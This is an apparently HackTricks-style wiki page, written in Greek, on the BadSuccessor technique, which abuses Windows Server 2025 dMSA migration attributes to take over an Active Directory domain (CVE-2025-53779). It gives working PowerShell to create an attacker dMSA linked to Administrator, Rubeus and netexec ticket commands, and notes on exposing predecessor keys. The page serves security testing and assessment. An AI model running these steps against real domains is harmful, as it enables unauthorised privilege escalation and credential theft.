# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το **BadSuccessor** καταχράται το workflow μετεγκατάστασης του **delegated Managed Service Account** (**dMSA**) που εισήχθη στα **Windows Server 2025**. Ένα dMSA μπορεί να συνδεθεί με έναν legacy account μέσω του **`msDS-ManagedAccountPrecededByLink`** και να μετακινηθεί μέσα από τις states μετεγκατάστασης που αποθηκεύονται στο **`msDS-DelegatedMSAState`**. Αν ένας attacker μπορεί να δημιουργήσει ένα dMSA σε ένα writable OU και να ελέγξει αυτά τα attributes, ο KDC μπορεί να εκδώσει tickets για το dMSA που ελέγχει ο attacker με το **authorization context του linked account**.

Στην πράξη αυτό σημαίνει ότι ένας low-privileged user που έχει μόνο delegated OU rights μπορεί να δημιουργήσει ένα νέο dMSA, να το δείξει στο `Administrator`, να ολοκληρώσει την migration state, και στη συνέχεια να αποκτήσει ένα TGT του οποίου το PAC περιέχει privileged groups όπως οι **Domain Admins**.

## Λεπτομέρειες μετεγκατάστασης dMSA που έχουν σημασία

- Το dMSA είναι feature των **Windows Server 2025**.
- Το `Start-ADServiceAccountMigration` θέτει τη migration σε κατάσταση **started**.
- Το `Complete-ADServiceAccountMigration` θέτει τη migration σε κατάσταση **completed**.
- `msDS-DelegatedMSAState = 1` σημαίνει ότι η migration ξεκίνησε.
- `msDS-DelegatedMSAState = 2` σημαίνει ότι η migration ολοκληρώθηκε.
- Κατά τη διάρκεια νόμιμης migration, το dMSA προορίζεται να αντικαταστήσει το superseded account διαφανώς, έτσι ώστε το KDC/LSA να διατηρούν την πρόσβαση που είχε ήδη το προηγούμενο account.

Το Microsoft Learn σημειώνει επίσης ότι κατά τη migration το αρχικό account δένεται με το dMSA και το dMSA προορίζεται να έχει πρόσβαση σε ό,τι μπορούσε να έχει πρόσβαση το παλιό account. Αυτή είναι η security assumption που καταχράται το BadSuccessor.

## Απαιτήσεις

1. Ένα domain όπου **υπάρχει dMSA**, πράγμα που σημαίνει ότι υπάρχει υποστήριξη για **Windows Server 2025** στην AD πλευρά.
2. Ο attacker μπορεί να **δημιουργήσει** `msDS-DelegatedManagedServiceAccount` objects σε κάποιο OU, ή έχει ισοδύναμα broad child-object creation rights εκεί.
3. Ο attacker μπορεί να **γράψει** τα σχετικά dMSA attributes ή να ελέγχει πλήρως το dMSA που μόλις δημιούργησε.
4. Ο attacker μπορεί να ζητήσει Kerberos tickets από domain-joined context ή από tunnel που φτάνει LDAP/Kerberos.

### Πρακτικοί έλεγχοι

Το πιο καθαρό operator signal είναι να επαληθεύσετε το domain/forest level και να επιβεβαιώσετε ότι το environment χρησιμοποιεί ήδη το νέο Server 2025 stack:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Αν δείτε τιμές όπως `Windows2025Domain` και `Windows2025Forest`, αντιμετωπίστε το **BadSuccessor / dMSA migration abuse** ως έλεγχο προτεραιότητας.

Μπορείτε επίσης να enumerate writable OUs delegated για dMSA creation με public tooling:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Ροή κατάχρησης

1. Δημιούργησε ένα dMSA σε ένα OU όπου έχεις delegated create-child rights.
2. Όρισε το **`msDS-ManagedAccountPrecededByLink`** στο DN ενός privileged target όπως `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Όρισε το **`msDS-DelegatedMSAState`** σε `2` για να σημειώσεις ότι το migration έχει ολοκληρωθεί.
4. Ζήτησε ένα TGT για το νέο dMSA και χρησιμοποίησε το επιστρεφόμενο ticket για να αποκτήσεις πρόσβαση σε privileged services.

Παράδειγμα PowerShell:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Αιτήματα Ticket / παραδείγματα operational tooling:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Γιατί αυτό είναι περισσότερο από privilege escalation

Κατά τη νόμιμη migration, το Windows πρέπει επίσης να χρησιμοποιεί το νέο dMSA για να χειρίζεται tickets που εκδόθηκαν για τον προηγούμενο account πριν από το cutover. Γι’ αυτό το dMSA-related ticket material μπορεί να περιλαμβάνει **current** και **previous** keys στη ροή **`KERB-DMSA-KEY-PACKAGE`**.

Για ένα fake migration που ελέγχει ο attacker, αυτή η συμπεριφορά μπορεί να μετατρέψει το BadSuccessor σε:

- **Privilege escalation** με κληρονομιά privileged group SIDs στο PAC.
- **Credential material exposure** επειδή ο χειρισμός previous-key μπορεί να εκθέσει material ισοδύναμο με το RC4/NT hash του predecessor σε vulnerable workflows.

Αυτό κάνει την technique χρήσιμη τόσο για direct domain takeover όσο και για follow-on operations όπως pass-the-hash ή ευρύτερο credential compromise.

## Σημειώσεις για την κατάσταση του patch

Η αρχική συμπεριφορά του BadSuccessor **δεν είναι απλώς ένα θεωρητικό preview issue του 2025**. Η Microsoft το όρισε ως **CVE-2025-53779** και δημοσίευσε security update τον **August 2025**. Κρατήστε αυτό το attack τεκμηριωμένο για:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **validation of OU delegations and dMSA exposure during assessments**

Μην υποθέσετε ότι ένα Windows Server 2025 domain είναι vulnerable απλώς επειδή υπάρχει dMSA· επαληθεύστε το patch level και δοκιμάστε προσεκτικά.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
